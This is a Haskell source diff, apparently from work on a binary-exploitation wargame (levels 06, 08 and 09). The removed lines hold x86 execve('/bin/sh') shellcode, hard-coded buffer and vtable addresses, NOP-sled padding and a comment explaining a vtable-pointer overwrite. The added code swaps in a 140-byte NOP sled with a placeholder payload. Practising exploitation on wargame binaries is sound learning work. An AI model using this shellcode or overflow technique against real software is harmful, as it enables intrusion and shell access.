@@ -33,6 +33,7 @@ import Data.Text (Text)
 import GHC.Word (Word32, Word8)
 import Numeric (showHex)
 import Shelly ((</>), (<.>), (-|-), cmd, inspect, shelly, touchfile, withTmpDir)
+import System.IO (stderr)
 import System.Posix.Process (executeFile)
 import System.Process (callProcess, rawSystem)
 
@@ -54,61 +55,24 @@ padTo fullBufLength string = nopSled <> string
     nopSled :: ByteString
     nopSled = B.replicate (fromInteger paddingLen) nop
 
-ebp :: Word32
-ebp = 0xf8d0ffff
+-- nonPaddedExploit :: ByteString
+-- nonPaddedExploit = shellCode <> encode bufAddress
 
-exploitLength :: Word32
-exploitLength = 70
+-- nopLength :: Int64
+-- nopLength = 112 - 8 - B.length shellCode
 
+-- paddedExploit :: ByteString
+-- -- paddedExploit = padTo exploitLength nonPaddedExploit
+-- paddedExploit = encode secAddress <> B.replicate nopLength nop <> nonPaddedExploit
 
--- TODO: 2015-07-23: ./level08 (0x804ea20 + nop sled + exploit + 0x804ea14)
---                                  ^                                ^
---                                  |                                |
---                                  |           This is the address of the
---                                  |           beginning of the annotation
---                                  |           buffer for the Number(5)
---                                  |           thing.  This will be
---                                  |           written to Number(6)'s
---                                  |           pointer to the vtable for
---                                  |           the + method.
---                                  |
---                          This is a couple bytes
---                          into the nop sled, which is
---                          in the annotation buffer for
---                          Number(5).
---
--- (nop sled + exploit) should probably be 0x68 bytes long.
+nops :: ByteString
+nops = B.replicate 140 nop
 
-bufAddress :: Word32
--- bufAddress = 0xa0FBFFBF
--- bufAddress = 0x14ea0408
-bufAddress = 0x0ca00408
-
-secAddress :: Word32
-secAddress = 0x20a00408
-
-shellCode :: ByteString
-shellCode = "\xeb\x18\x5e\x31\xc0\x88\x46\x07\x89\x76\x08\x89\x46"
-         <> "\x0c\xb0\x0b\x8d\x1e\x8d\x4e\x08\x8d\x56\x0c\xcd\x80"
-         <> "\xe8\xe3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68"
-
-nonPaddedExploit :: ByteString
-nonPaddedExploit = shellCode <> encode bufAddress
-
-nopLength :: Int64
-nopLength = 112 - 8 - B.length shellCode
+exploit :: ByteString
+exploit = "abcd"
 
 paddedExploit :: ByteString
--- paddedExploit = padTo exploitLength nonPaddedExploit
-paddedExploit = encode secAddress <> B.replicate nopLength nop <> nonPaddedExploit
-
-paddedExploitString :: String
-paddedExploitString = chr . fromEnum <$> B.unpack paddedExploit
-
-turnIntoEscapedBashString :: String -> String
-turnIntoEscapedBashString string = "$'" ++ go ++ "'"
-  where
-    go = concat $ fmap ((++) "\\x" . flip showHex "" . ord) string
+paddedExploit = nops <> exploit
 
 main :: IO ()
 main = do
@@ -124,7 +88,12 @@ main = do
     -- putStrLn $ "LANG=fr gdb -command test.gdb --args ./level06 " ++ firstArg ++ " " ++ secondArg
     -- putStrLn $ "gdb --args ./level09 " ++ turnIntoEscapedBashString paddedExploitString
     -- print "ended."
-    B.putStrLn "hellooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo"
+    B.putStrLn paddedExploit
+
+    B.hPutStr stderr "\n"
+    B.hPutStr stderr "---------------\n"
+    B.hPutStr stderr "-- Finished. --\n"
+    B.hPutStr stderr "---------------\n\n"
 
 -- main = shelly $
 --     withTmpDir $ \temp -> do
